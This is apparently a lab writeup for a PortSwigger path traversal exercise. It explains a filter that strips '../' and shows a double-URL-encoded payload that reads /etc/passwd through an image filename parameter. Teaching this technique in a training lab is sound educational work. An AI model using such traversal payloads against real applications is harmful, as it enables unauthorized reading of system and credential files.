---
title: "dt 4 - portswigger labs"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "path-traversal", "cyberchef", "lfi", "web-exploitation", "dt-4"]
summary: "web writeup for \"dt 4\" from portswigger labs - techniques: path-traversal, cyberchef, lfi, web-exploitation, dt-4."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/Directory-Traversal/dt-4/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Directory-Traversal/dt-4/README.md"
ctf:
  name: "portswigger labs"
  challenge: "dt 4"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** dt 4
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/Directory-Traversal/dt-4/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Directory-Traversal/dt-4/README.md>

---
# File path traversal, traversal sequences stripped with superfluous URL-decode | Dec 12, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode), you'll learn: File path traversal, traversal sequences stripped with superfluous URL-decode! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks input containing [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021236.png)

**In the previous labs, we found that there is a file path traversal vulnerability in the display of product images:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021340.png)

**Also, in the lab background, it said:**

> The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

**To bypass that, we can use double URL encoding:**

**To do so, I'll use [CyberChef](https://gchq.github.io/CyberChef/) to do URL encoding:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021554.png)

**Now, we can use `%252E%252E%252F` as `../`:**
```
# Before URL encoded
/image?filename=../../../etc/passwd

# After double URL encoded
/image?filename=%252E%252E%252F%252E%252E%252F%252E%252E%252F/etc/passwd
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Directory-Traversal/DT-4/images/Pasted%20image%2020221212021658.png)

# What we've learned:

1. File path traversal, traversal sequences stripped with superfluous URL-decode
